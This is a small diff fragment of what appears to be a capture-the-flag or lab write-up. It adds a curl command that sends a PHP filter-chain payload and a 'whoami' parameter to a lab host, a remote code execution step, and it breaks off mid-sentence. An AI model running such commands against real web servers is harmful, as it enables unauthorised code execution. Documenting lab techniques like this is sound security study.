@@ -334,5 +334,9 @@ https://github.com/synacktiv/php_filter_chain_generator
 
 This will inject the `0` as a parameter
 
+```python
+❯❯❯ curl -s -G 'http://docs-0eoyfsyajxs.traverse.hsm/' -H 'Cookie: TRAVERSESESSID=<session ID>' --data '<PHP chain value>' --data '0=whoami'
+```
 
+But based off the baha
 
